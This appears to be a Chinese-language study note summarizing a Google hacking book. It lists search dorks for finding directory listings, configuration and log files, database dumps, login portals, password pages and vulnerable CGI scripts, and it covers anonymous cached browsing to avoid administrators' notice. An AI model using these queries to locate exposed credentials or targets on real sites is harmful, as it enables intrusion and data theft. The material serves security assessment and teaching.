<p><strong>2.3.12 Related： 显示相关站点</strong></p>
<ul>
<li>显示与“提交的网站或URL相关的” 站点</li>
<li>不能很多地和其他操作符或者关键字混合使用</li>
<li>擅长搜索网页</li>
</ul>
<p><strong>2.3.13 Author： 搜索Groups中新闻组帖子的作者</strong></p>
<ul>
<li>搜索Group帖子的作者</li>
<li>能够和其他混合使用</li>
<li>擅长搜索Group</li>
</ul>
<p><strong>2.3.14 Group： 搜索Group标题</strong></p>
<p><strong>2.3.15 Insubject： 搜索Google group主题行</strong></p>
<ul>
<li>在Group帖子的主题中查找字符串</li>
<li>能够很好地和其他操作符或搜索关键字混合使用</li>
</ul>
<p><strong>2.3.16 Msgid： 通过消息ID来查找Group帖子</strong></p>
<ul>
<li>不能很好的和其他操作符混合使用</li>
</ul>
<p><strong>2.3.17 Stocks： 搜索股票信息</strong></p>
<p><strong>2.3.18 Define： 显示某个术语的定义</strong></p>
<ul>
<li>显示对提供的单词或者词组的各种定义</li>
<li>不能很好地和其他操作符或者关键字混合使用</li>
<li>擅长搜索网页</li>
</ul>
<p><strong>2.3.19 Phonebook: 搜索电话列表</strong></p>
<ul>
<li>rphonebook    住宅电话列表</li>
<li>bphonebook    商业电话列表</li>
<li>phone book    商业和住宅电话列表</li>
</ul>
<p><strong>2.4操作符冲突与糟糕的Search-Fu</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3926.png" alt="0"></p>
<p><strong>2.5 网站链接</strong></p>
<ul>
<li>Google文件类型FAQ， <strong><a href="http://www.google.com/help/faq_filetypes.html">www.google.com/help/faq_filetypes.html</a></strong></li>
<li>文件扩展名信息资源，<strong><a href="http://www.filext.com">www.filext.com</a></strong>  这个网站能够帮助你找到某个特定的扩展名与何种程序相关联</li>
<li><strong><a href="http://searchenginewatch.com/searchday/article.php/20160061">http://searchenginewatch.com/searchday/article.php/20160061</a></strong> 这篇文章讨论了和Google日期限定搜索选项有关的话题</li>
<li>非常棒的在线Julian日期转换工具，<strong><a href="http://www.24hourtranslations.co.uk/dates.htm">www.24hourtranslations.co.uk/dates.htm</a></strong>和<strong><a href="http://www.tesre.bo.cnr.it/~mauro/JD/">www.tesre.bo.cnr.it/~mauro/JD/</a></strong></li>
</ul>
<p><strong>第三章 Google hacking基础</strong></p>
<p><strong>3.1 简介</strong></p>
<ul>
<li>在浏览页面的缓存版本时。存在某种匿名隐藏的特征，来隐藏你的浏览行为</li>
<li>本章我们将了解一种遍历技术， 学习： <strong>目录遍历</strong>、<strong>数字范围扩展</strong>以及<strong>扩展名搜索</strong></li>
</ul>
</li>
</ul>
<p>  <strong>3.2 使用缓存进行匿名浏览</strong></p>
<ul>
<li>Google会保存大部分他所抓取到的网页数据。虽然并不是都是如此而且这种情况也是可以防止的，但是大多数Google抓取的数据都被复制了一份，而且可以通过搜索结果页面的缓存链接来访问</li>
<li><a href="http://www.phrack.org">www.phrack.org</a></li>
<li>点击缓存链接斌不是只从Google的数据库中加载网页，他还会连接到真是的服务器以访问图片以及其他非HTML内容</li>
<li>在缓存URL的尾部添加<strong>&amp;**</strong>strip=1<strong>将只显示缓存网页的文本。以这种范式访问缓存页面不会连接到网站的真实服务器，而且如果你使用的是本章中提到的剪切和粘贴的方法，还能够保护你的</strong>匿名性**。</li>
<li>tcpdump -n命令来抓捕这些数据</li>
<li>也可以使用服务器网站 eg：atomintersoft |  samair.ru</li>
</ul>
<p>  <strong>3.3 目录列表</strong></p>
<ul>
<li>目录列表是一种能够列出网站服务器上存在的文件和目录的网页类型。</li>
</ul>
<p>  <strong>目录列表十分类似于FTP服务器</strong></p>
<ul>
<li>它们自身并不安全</li>
<li>它们显示出来的信息能够帮助攻击者了解网站服务器的某些特定技术细节</li>
<li>它们无法区分公开的文件和那些私有的文件</li>
<li>它们通常都是偶然显示出来的，这是因为许多网站服务器都是在顶层索引文件（index.htm、index.htm 、default.asp等）丢失或者无效的时候才会显示目录</li>
</ul>
<p>  <strong>3.3.1 查找目录列表</strong></p>
<ul>
<li>目录列表包含了大量很有价值的目录</li>
<li>最好的查找包含目录列表页面的方法是使用诸如intitle:index.of “parent directory” 或者 intitle:index.of name size之类的查询</li>
</ul>
<p>  <strong>3.3.2 查找特定的目录</strong></p>
<ul>
<li>你可以很容易地在目录列表中查找特定的目录，而只需要index.of查询上加一个目录名即可。例如，intitle:index.of inurl:backup可以用来查找URL中含有单词backup的目录列表。如果URL中含有单词backup，那么很有可能这是一个目录名</li>
</ul>
<p>  <strong>3.3.3 查找特定的文件</strong></p>
<ul>
<li>你可以很容易地在目录列表中查找特定的文件： 只需要简单地在index.of查询中加入文件名即可，例如intitle:index.of ws_ftp.log</li>
</ul>
<p>  <strong>3.3.4 服务器版本</strong></p>
<ul>
<li>某些服务器，尤其是Apache和Apache的派生服务器常常会在目录列表的底部加上一个服务器标志。这些服务器标志可以通过拓展index.of搜索来查找到，如intitle:index.of server.at</li>
<li>你也可以搜索特定版本的web服务器，这是通过添加一个正确格式的服务器标志来实现的。例如， intitle:index.of server.at “Apache Tomcat/“ 能够找到运行各种版本的Apache Tomcat服务其的网站（<strong>同样的nmap也可以来识别</strong>）</li>
</ul>
<p>  <strong>3.4 险境：遍历技术</strong></p>
<p>  <strong>3.4.1  目录遍历</strong></p>
<ul>
<li>一旦你在服务器上找到了某个特定的目录，就可以使用这个技术来查找其他的目录或者子目录</li>
<li>完成这种任务的一个简单的办法就是利用目录列表。只要点击parent directory链接，就可以进入当前目录的上一级目录。如果该父目录仍包含其他的目录列表，那么你可以通过点击其链接来挖掘其他的目录。如果父目录没有显示目录列表，那么你可能就需要诉诸于一种更为复杂的方法了。即猜测目录名并把他们添加到父目录的URL的尾部。或者，考虑在Google搜索中使用site和Inurl关键词</li>
</ul>
<p>  <strong>3.4.2 递增置换</strong></p>
<ul>
<li>递增置换是 “取一个数并用下一个更大的或者更小的数来代替这个数” 的形象的说法</li>
<li>这个技术可以用于挖掘在目录名或者文件名中使用数字的站点。这种技术只需要用更大的或者更小的数来替代原来的数字，但是要注意保持文件名或者目录名中剩下的部分不变（注意那些零）。或者，在Google搜索中使用site，在加上inurl或者filetype关键字。</li>
</ul>
<p>  <strong>3.4.3 拓展遍历</strong></p>
<ul>
<li>这种技术可以用于查找文件名相同，而扩展名不同的文件（例如备份文件）</li>
<li>实现拓展遍历技术最容易的方法是在URL中，用一种扩展名来替代另一种扩展名，例如，用bak代替html</li>
<li>目录列表，尤其是缓存目录列表，是最容易判定备份文件是否存在的方法，也能够判定可能用于网站其他部分的扩展名</li>
</ul>
<p>  <strong>3.5 网站链接</strong></p>
<ul>
<li><strong><a href="http://www.all-nettools.com/pr.htm">www.all-nettools.com/pr.htm</a></strong>    一个简便的代理检查工具，它能够帮助你测试正在使用的代理服务器</li>
<li><strong><a href="http://www.sensepost.com/research/wikto">http://www.sensepost.com/research/wikto</a></strong>    Sensepost的Wikto工具，一个很强大的web扫描工具，它还结合了使用Google hacking数据库的Google查询测试。</li>
<li><strong>一个简单的Google搜索可以用来在不对站点管理员或侵入检测系统，并且搜集到的信息都可以在以后的评估中重复使用。</strong></li>
</ul>
<p>  <strong>第四章 文档加工和数据库挖掘</strong></p>
<p>  <strong>4.1 简介</strong></p>
<ul>
<li>互联网上的文档都是有价值的。“好人”和“坏人”都可以利用在文档中的信息来达到他们各自的目的</li>
<li>这章我们就来学习一下关于文档的挖掘</li>
</ul>
<p>  <strong>4.2 配置文件</strong></p>
<p>  <strong>4.2.1 基本信息：</strong></p>
<ul>
<li>配置文件能够向攻击者泄露<strong>敏感的信息</strong></li>
<li>尽管配置文件的文件名不同，但是仍可以通过文件的扩展名来找到配置的文件，例如<strong>INI、CONF、CONFIG、或CFG</strong></li>
<li>配置文件存储了程序的设置和程序的用法</li>
<li>对于配置文件来说攻击者可以根据其提供的各种信息来寻找相应的方法甚至继续在寻找更深的东西出来</li>
<li>对于搜索文件来说最好尝试用不同类型的搜索方法 eg:<strong>intitle:index.of ws_ftp.ini</strong> | <strong>filetype:ini inurl:ws_ftp.ini</strong> 都可以找到一些东西</li>
<li>eg： <strong>filetype:conf inurl: firlwall</strong>  它可以搜索出防火墙的配置文件 </li>
<li>eg： <strong>(inurl:conf OR inurl:config OR inurl:cfg)</strong>使用这样的联合搜索 正如一个攻击者知道你的配置文件的名称就可以通过filetype inutl 来更准确的寻找需要的文件 </li>
</ul>
<p>  <strong>4.2.2 对于一个Google黑客在搜索配置文件是应该注意的一些东西：</strong></p>
<ul>
<li>使用可用的配置文件中特有的单词或词组来创建一个强大的基本搜索</li>
<li>过滤掉sample example test howto tutorial单词以剔除明显的实例文件</li>
<li>用-cvs过滤掉CVS存储器，他们通常存放了默认的配置文件</li>
<li>如果是搜索UNIX程序的配置文件，那么就要过滤掉manpage或者Manual</li>
<li>搜索实例配置文件中最长改变的域，并且对该与执行缩简搜索、以提出可能的样例文件</li>
</ul>
<p>  <strong>4.2.3 配置文件搜索实例：</strong></p>
<p>  ​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4958.jpeg" alt="0"></p>
<p>  ​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4957.jpeg" alt="0"></p>
<p>  <strong>4.3 日志文件</strong></p>
<ul>
<li><p>日志文件记录了一些信息 甚至包括一些时间和 IP地址到用户名与口令 例如银行卡账号</p>
</li>
<li><p>filetype:log inurl: log 或者是更简单的ext:log log</p>
</li>
<li><p>下面列出一些日志文件搜索实例</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4972.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4974.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>filetype:log username putty</strong> 下图为搜索的结果该结果也可以在下一次<strong>继续使用</strong></p>
<p>  ​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4976.jpeg" alt="0"></p>
<p>  <strong>一些较为敏感的office文档：</strong></p>
<p>  ​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4985.jpeg" alt="0"></p>
<p>  ​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4984.jpeg" alt="0"></p>
<p>  <strong>4.4 数据库挖掘</strong></p>
<ul>
<li>登陆入口，尤其是软件制造商提供的默认入口，是可以很容易就搜索到的 eg：login welcome copyright statements</li>
<li>位于服务器端和客户端的软件都有帮助文件， 这些文件会泄露关于应用程序配置和用法的信息</li>
<li>不同的错误消息的内容都能用来剖析目标</li>
<li>数据库转储已证明是所有数据库的发现中泄露信息最多的，因为他们包括完整的或者部分的数据哭内容，可以通过数据库转储的头部字符搜索来得到， eg: “#Dumping data for table”</li>
</ul>
<p>  <strong>4.4.1 登陆入口：</strong></p>
<ul>
<li><p>搜索登陆入口 <strong>eg: inurl: admin | login</strong>  等</p>
</li>
<li><p>下面是一些搜索的例子</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4994.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4995.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>4.4.2 帮助文件</strong></p>
<ul>
<li><p>其可能泄露机器名，用户名和明文口令</p>
</li>
<li><p>下面是一些帮助文件的搜索</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5008.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5009.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>4.4.3 错误信息：</strong></p>
<ul>
<li><p>错误信息会泄露更多关于服务器上可能存在的漏洞的危险信息</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5016.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5018.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5017.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5015.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>4.4.4 数据库转储：</strong></p>
<ul>
<li><p>数据库的任意格式的输出都可以看做是数据库的转储 它可以泄露出很多信息</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5028.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>4.4.5 实际的数据库文件：</strong></p>
<ul>
<li><p>对于数据库存储文件来说 Google只适用于用一个特定的文件名或扩展名的文件来表示数据库</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5035.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5034.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>4.6 网站链接：</strong></p>
<ul>
<li><strong><a href="http://www.filext.com">www.filext.com</a></strong>        一个关于文件扩展名信息的不错的资源。</li>
<li><strong><a href="http://desktop.google.com">http://desktop.google.com</a></strong>        Google桌面搜索应用程序</li>
<li><strong>http”//johnny.ihackstuff.com</strong>        Google hacking数据库的主页，在其中你可以找到更多的和本章中列出的那些搜索相近的搜索</li>
</ul>
<p>  <strong>4.7 一些感想</strong></p>
<ul>
<li>如果防止下载 .INC文件或者将扩展名改为.PHP 隐藏其中的内容</li>
<li>如果想要防止这方面的信息泄露，应该模拟一次信息的渗透测试来修改你不希望的出现的东西，甚至可以放一些文件来误导攻击者</li>
<li>对于附录网站敏感信息或者绝对路径的文件，应该放在一些无法read的目录或隐藏</li>
</ul>
<p>  <strong>第五章 Google在信息收集框架中扮演的角色</strong></p>
<p>  <strong>5.1 简介</strong></p>
<ul>
<li>黑客实际上是一种心境以及一种思考方式，而不是一种物理属性</li>
</ul>
<ol>
<li>因为他们想了解大多数人所不了解的</li>
<li>知识就是力量</li>
</ol>
<p>  <strong>5.2 自动搜索原则</strong></p>
<ul>
<li>确定原始搜索关键字</li>
<li>扩展 搜索关键字</li>
<li>从数据源获取数据</li>
<li>解析数据</li>
<li>在后期过程中，将数据处理为信息</li>
</ul>
<p>  <strong>5.2.1 原始搜索关键字</strong></p>
<ul>
<li>清晰的定义目标大概算是所有搜索中最不相同的部分了，好的搜索不可能得到一个不清晰的目标。在进行自动化搜索时，手动搜索中的原则也同样适用：无用的信息输入，无用信息输出。</li>
</ul>
<p>  <strong>5.2.2 扩展搜索关键字</strong></p>
<ul>
<li>扩展搜索关键字是人类的天性，自动化搜索真正的本领就在于它能思考人类工作过程并且能够将改过程翻译成某种算法</li>
</ul>
<p>  <strong>（对于自动化查找则和字典相同去匹配各种邮箱来找到你所使用的东西）</strong></p>
<ol>
<li><p>E-mail地址</p>
</li>
<li><p>电话号码</p>
</li>
<li><p>人</p>
</li>
<li><p>获取大量结果</p>
</li>
<li><p>更多组合</p>
</li>
<li><p>使用“特殊的”操作符</p>
<p>eg：</p>
</li>
</ol>
<ul>
<li>filetype:ppt site:www.****.gov</li>
<li>filetype:doc site:www.****.gov</li>
<li>filetype:xls site:www.****.gov</li>
<li>filetype:pdf site:www.****.gov</li>
</ul>
<p>  <strong>5.2.3 从数据源获取数据</strong></p>
<p>  <strong>1.自行抓取——请求并接受响应</strong></p>
<ul>
<li>这是获取结果的另一种灵活的方式。你完全可以控制整个过程，并且可以进行诸如设置结果数量这类工作——使用应用编程接口（Applocation Programming Interface, API）你一旦进行了该工作，你的顾虑就被完全打消了，并且会开始着手调节参数</li>
</ul>
<p>  <strong>NETCAT</strong></p>
<ul>
<li><strong>人们称Netcat是TCP/Internet Protocol (IP)的瑞士军刀。对于黑白两道而言，它都是一个极有的工具；从漏洞利用获取反解的shell（黑帽）到帮助网络管理员分析协议（白帽）。</strong></li>
</ul>
<p>  <strong>2. 自行抓取——解析结果</strong></p>
<ul>
<li>可以用netcat抓取结果并自动做结果解析</li>
</ul>
<p>  <strong>3.Dapper</strong></p>
<ul>
<li>Dapper站点（<strong><a href="http://www.dapper.net">www.dapper.net</a></strong>）支持用户创建一种他们称为Dapper的东西。这些Dapp是很小的程序，可以从任何站点抓取信息，并将这些抓取的数据以几乎任何一种方式传递 （例如，XML、CSV、RSS等）</li>
</ul>
<p>  <strong>4.Aura/EvilAPI</strong></p>
<ul>
<li>一种能拦截Google API调用并返回简单对象存取协议（Simple Object Access Protocol, SOAP） XML的应用程序——基于仍旧在使用的API的应用程序不需要进行任何改动。</li>
</ul>
<p>  <strong>5.使用其他搜索引擎</strong></p>
<ul>
<li>除了Google外，世界上还有很多搜索引擎！MSN引擎也支持API</li>
</ul>
<p>  <strong>API</strong>：API就是操作系统留给应用程序的一个调用接口，应用程序通过调用操作系统的 API 而使操作系统去执行应用程序的命令（动作）。</p>
<p>  <strong>5.2.4解析数据</strong></p>
<ol>
<li>解析E-mail地址</li>
<li>域和子域</li>
<li>电话号码</li>
</ol>
<p>  <strong>5.2.5 后期处理</strong></p>
<ol>
<li>按相关性对结果进行分类</li>
<li>非摘要内容</li>
<li>呈现结果</li>
</ol>
<p>  <strong>5.3 搜索关键字</strong></p>
<p>  <strong>5.3.1 在Web上收集</strong></p>
<ul>
<li>你可以从中搜索到其他人的搜索关键字的泄露站点会突然出现，一旦你找到了一些有趣的东西，你将会看到此人执行的所有的其他的搜索</li>
</ul>
<p>  <strong>5.3.2 自行收集</strong></p>
<ul>
<li>当你搜索某些资料时，查询都会定位到Google计算机。你每次在Google上执行搜索时，他们都会查看你是否通过了一个cookie。如果没有会指示你的浏览器设置一个 </li>
</ul>
<p>  <strong>//  然后可以使用burfsuite去搞一些事情</strong></p>
<ul>
<li><strong>隐藏 甜言蜜语：</strong> 假设你在运行一个代号为“Sookha”的超级机密项目。没有人知道这个项目的名称。如果某人想去Google上查找单词Sookha，那么你应该在不让搜索者察觉你所了解的事实情况下获知。<strong>你能做的就是注册一个使用Sookha作为关键字的关键字广告。</strong></li>
</ul>
<p>  <strong>5.4一些感想</strong></p>
<ul>
<li>应该建立一个自己的字典脚本来对于一些查询</li>
<li>学习一些python脚本来为你的自动搜索做一些事情</li>
<li>对于一个隐晦的不想让他人通过Google在搜索出来的东西可以以该名字作为一个广告的关键字</li>
</ul>
<p>  <strong>第六章 搜索漏洞利用与查找目标</strong></p>
<p>  <strong>6.1 简介</strong></p>
<ul>
<li>漏洞利用（exploit）代码时黑客使用的一种工具。他们设计用来洞察一个目标，大部分黑客都有许多可以随意支配的漏洞利用。而大部分的漏洞利用在某段时间内时不公开的，不过他们最终会公布，发布出来，而我们正式利用这一点来进行Google搜索 找到一些可以使用的和一些可以被攻击的目标</li>
</ul>
<p>  <strong>6.2搜索漏洞利用代码</strong></p>
<ul>
<li><p>可以通过关注那些常见的字符串，例如exploit或者vulnerablility，来搜索公开的漏洞利用站点。如果想让结果更为精确，可以给查询附上filetype操作符，以查询以特定程序设计语言所编写的漏洞利用  eg:    filetype:c c |  filetype:c exploit |  php</p>
</li>
<li><p>即可以使用filetype指定文件扩展名，也可以使用源代码中的常见字符串，例如“include ”，来查找漏洞利用代码</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5996.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5998.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>6.3 Google代码搜索</strong></p>
<ul>
<li><p>Google代码搜索，可以用来搜索程序内部的代码，但是它也可以用来搜索导致漏洞的编程错误</p>
</li>
<li><p>除了允许查询包括强大的正则表达式外，代码搜索还引入了特殊的搜索符，如下</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6000.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6002.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>6.4 搜索恶意软件和可执行文件</strong></p>
<ul>
<li>Google不止会抓取，还会分析二进制文件或者可执行文件</li>
<li>Google的二进制搜索功能可以用来剖析可执行文件，但是它也可以用来搜索Web上的可用恶意软件</li>
</ul>
<p>  <strong>6.5 搜索易受攻击的目标</strong></p>
<ul>
<li>攻击者可以利用软件制造商提供的应用程序的演示程序中出现的字符串来搜索潜在的目标</li>
<li>攻击者也可以下载并选择性安装易受攻击的产品，从而在应用程序显示的字符串中查找特殊的字符串</li>
<li>不管字符串是如何获得的，它都能够很容易地转换成Google查询，彻底缩短了在公开漏洞公告之后，访问人员花在加固站点安全上的时间</li>
</ul>
<p>  <strong>6.5.1 利用演示页面搜索目标</strong></p>
<ul>
<li>通过演示页面来获取web对应的一些版本信息在来进行查询</li>
</ul>
<p>  <strong>6.5.2 利用源代码搜索目标</strong></p>
<ul>
<li>同样的原来在网页上下载对应的网站源代码来找到网站的信息，针对各种信息在做出对应的查询</li>
</ul>
<p>  <strong>6.5.3 利用CGI扫描搜索目标</strong></p>
<ul>
<li><p>利用CGI扫描器    一个CGI扫描器可以在一个数据文件中列出易受攻击的文件和目录</p>
</li>
<li><p>eg： inurl:/cgi-bin/userreg.cgi        |    filetype:cgi inurl:userreg.cgi</p>
<p>​    </p>
</li>
</ul>
<p>  <strong>6.6 网站链接</strong></p>
<ul>
<li><a href="http://www.sensepost.com/research/wikto/">www.sensepost.com/research/wikto/</a>    Wikto,一个很棒的Google和web扫描器</li>
<li><a href="http://www.cirt.net/code/nikto.shtml">www.cirt.net/code/nikto.shtml</a> Nikto, 一很棒的Web扫描器</li>
<li><a href="http://packetstormsecurity.com">http://packetstormsecurity.com</a>    一个很棒的工具和漏洞利用站点</li>
</ul>
<p>  <strong>6.10 一些想法</strong></p>
<ul>
<li>这是因为它能够使用strip=1参数来显示缓存页面</li>
</ul>
<p>  <strong>第7章 简单有效的安全性搜索</strong></p>
<p>  <strong>7.1 简介</strong></p>
<ul>
<li>针对安全方面的工作而言，我们来看看在安全性评估中相当有效的10个搜索，但这仅仅是作为你的前10位列表的基础。</li>
</ul>
<p>  <strong>7.1.1 site</strong></p>
<ul>
<li>site操作符擅长从Google所收集的内容中提取与目标有关的信息</li>
<li>这个操作符常用于和其他本章中提到的查询组合使用，以对某一目标实现精确搜索</li>
<li>site搜索也可以用来收集关于目标主机或服务器的信息</li>
<li>eg：        <strong>site:nytimes.com-site:**</strong><a href="http://www.nytimes.com">www.nytimes.com</a>**</li>
</ul>
<p>  <strong>7.1.2 intitle:index.of</strong> </p>
<ul>
<li>针对<strong>Apache</strong>风格的目录列表的通用搜索</li>
<li>目录列表能够给攻击者提供又价值的信息</li>
</ul>
<p>  <strong>7.1.3 error | warning</strong></p>
<ul>
<li><strong>(“for more information” | “not found”) (error | warning)</strong> 查询就返回了很多条有趣的结果</li>
<li>错误消息在每种坏境下都会泄露出很多信息</li>
<li>在某些情况下，警告文本能够提供目标所使用的代码内部的重要信息</li>
</ul>
<p>  <strong>7.1.4 login | logon</strong></p>
<ul>
<li>登陆 <strong>(login)</strong> 入口就是一个网站的”前门” 可以查询出来</li>
<li>这个查询可以高效地搜索出登陆人口</li>
<li>它也可以用来获取用户名以及解决问题的步骤</li>
</ul>
<p>  <strong>7.1.5 username | userid | employee.ID | “your username is”</strong></p>
<ul>
<li>有许多不同的方法用来从一个目标系统中获取用户名，即使在大多数的认证机制中，用户名都是不太重要的一半，但是至少应对它进行最低限度的保护，以防止外人获取</li>
<li><strong>一种获取用户名的最通用的搜索</strong></li>
<li>当这个查询不能获取用户名时，其周围的上下文也能泄露攻击者可以用于后续攻击行为的信息</li>
</ul>
<p>  <strong>7.1.6 passworl | passcode | “your passcode is”</strong></p>
<ul>
<li>这个查询反映了<strong>password</strong>的常见的方法</li>
<li>这个查询能够泄露描述登陆步骤、口令修改步骤以及目标所用的口令策略的文档。对于搜索有关电话会议的信息而言，特别是在<strong>Google</strong>日历搜索中，<strong>passcode</strong>特别有用</li>
<li>一般性的搜索是没有什么用的但是如果加上site搜索就变得不寻常了</li>
</ul>
<p>  <strong>7.1.7 admin | administrator</strong></p>
<ul>
<li>该查询用两个最常用的术语来表示网站的所有者或者维护者，可以用来暴露程序上的信息(例如”contact your administrator”)，甚至是管理登陆入口</li>
</ul>
<p>  <strong>7.1.8 -ext”:html -ext:html -ext:shtml -ext:asp -ext:php</strong></p>
<ul>
<li>当把这个查询和site操作符组合使用时，能够剔除最常见的文件，而暴露更有趣的文档</li>
<li>该查询也可以针对不同的目标而作相应的修改以剔除其他的常见文件累心</li>
</ul>
<p>  <strong>7.1.9 inurl:temp | inurl:tmp | inurl:backup | inurl:bak</strong></p>
<ul>
<li>查询也可以针对不同的目标而作相应的修改以剔除其他的常见文件，而暴露出更有趣的文档</li>
</ul>
<p>  <strong>7.1.10 intranet | help.desk</strong></p>
<ul>
<li>这个查询用来搜索内部网络站点（这些站点应该收到保护以防止外部人员访问）以及服务台联系信息和操作步骤</li>
</ul>
<p>  <strong>7.2 一些想法</strong></p>
<ul>
<li>规模较大的查询列表中的大多数搜索都是非常特殊的，它们只针对很少的一部分互联网站点。虽然这些特殊查询的效果极佳，但是一般最好还是保存一个规模较小的强大的搜索列表，以在评估中灵活地创造出丰富的搜索，尤其是当你用常规方法感到无计可施时更为有用</li>
</ul>
<p>  <strong>第8章 跟踪搜索Web服务器、登陆入口和网络硬件</strong></p>
<p>  <strong>8.1 简介</strong></p>
<ul>
<li>通常认为，渗透测试人员也是专业的黑客，因为它们本质上通过攻入客户的网路来查找、记录并且最终帮助客户解决系统或者网络中的安全缺陷的</li>
</ul>
<p>  <strong>8.2 定位并分析Web服务器</strong></p>
<ul>
<li>目录列表和默认的服务器生产的错误消息可以提供一些关于服务器的信息。即使这些信息可以通过直接连接到服务器来得到，但是一名拥有针对特定版本的软件的漏洞利用程序的攻击者会使用Google查询来搜索相应的目标，而这些Google查询都是针对这类信息设计的</li>
<li>攻击者尤其会关注操作系统，Web服务器软件的版本和名称、默认的配置，有漏洞的脚本，或者这些因素的任意组合</li>
<li>Google查询更为隐蔽而且也给攻击者和目标之前提供了某种程度的隔离</li>
<li>服务器和应用程序错误消息暴露了大量的信息，从软件的版本和补丁级别到源代码片段以及关于系统进程和程序的信息，错误消息是最被低估的信息泄露途径之一</li>
</ul>
<p>  <strong>8.2.1 目录列表</strong></p>
<ul>
<li>对与服务器的目录列表的程序“server at “Apache/2.0.52” ” 查找具有Apache 2.0.52 server标记的目录列表的服务器</li>
</ul>
<p>  <strong>8.2.2 Web服务器软件的错误信息</strong></p>
<ul>
<li>对于Microsoft IIS 默认情况下在IIS 5和IIS 6在服务器遇到某种问题时，会显示相应的静态的HTTP/1.1错误消息，这些错误页面默认保存在%SYSTEMROOT%\help\iishelp\common目录</li>
<li>对于服务器报错，搜一些错误信息 httpd.conf        bottom.html</li>
<li>可以使用一些基本的shell命令，我们就能吧错误页面的标题与可能出现在错误页面上的文本分离出来        <strong>//grep -h -r “Content-language: en” -A 10 | grep -A5 “TITLE” | grep -v virtual</strong></li>
</ul>
<p>  <strong>8.2.3 应用软件错误消息</strong></p>
<ul>
<li>查询”Fatal error: Call to undefined function” -reply -the -next 能查找到ASP错误消息</li>
<li>查询 intext: “warning: Failed opening “ include_path 可以找到一些常见的错误，许多错误都会泄露路径名和文件名</li>
</ul>
<p>  <strong>8.2.4 默认页面</strong></p>
<ul>
<li><p>查找特殊类型的服务器或者Web软件的方法时搜索默认的Web页面。大多数的软件，包括Web服务器软件自身，都带有一个或多个默认或测试页面。这些页面可以让管理员方便地测试Web服务器或者应用程序的安装。</p>
</li>
<li><p><strong>一些查找特定服务器的查询</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6832.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6830.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6833.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6831.png" alt="0"></p>
</li>
</ul>
<p>  <strong>8.2.5 默认文档</strong></p>
<ul>
<li><p>Web服务器软件通常会附带一些手册和文档，它们位于Web目录中。攻击者可以利用这种文档对Web软件进行剖析或者搜索。</p>
</li>
<li><p>大部分一些文档会透露着一些服务器什么的默认设置甚至一些管理员的默认账户密码</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6884.png" alt="0"></p>
</li>
</ul>
<p>  <strong>8.2.6 示例程序</strong></p>
<ul>
<li><p>Web软件除了附带文档和手册之外，一个软件包通常还包含一些默认的应用程序。这些默认的应用程序，例如默认的Web页面，可以帮助演示软件的功能，作为开发者的起点，提供可以用作学习工具的实例函数和代码。</p>
</li>
<li><p>例如Microsoft Index Server的内容查找可以允许Web访问者搜索整个网站的内容。在某些情况下，这个查询页面能够查找到没有被其他任何页面链接的页面或者包含敏感信息的页面</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6902.png" alt="0"></p>
</li>
<li><p>你可以使用这些缓存页面与&amp;strip=1选项一道来匿名查看页面，这可以让信息收集工作远离服务器管理员的监视</p>
</li>
<li><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6911.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6915.png" alt="0"></p>
</li>
</ul>
<p>  <strong>8.3 定位登陆入口</strong></p>
<ul>
<li><p>登陆入口会吸引那些正搜索特定类型软件的攻击者。另外，登陆入口也可以作为信息收集攻击的起点。因为大多数登陆入口都是设计成对用户友好的，给新用户提供帮助文档和操作步骤的链接。管理登陆入口和远程股管理工具有时更加危险，尤其是当它们没有被正确的配置时</p>
</li>
<li><p>一些登陆入口，类似allinurl:” exchange/logon.asp” 可能会提供大量关于服务器的信息</p>
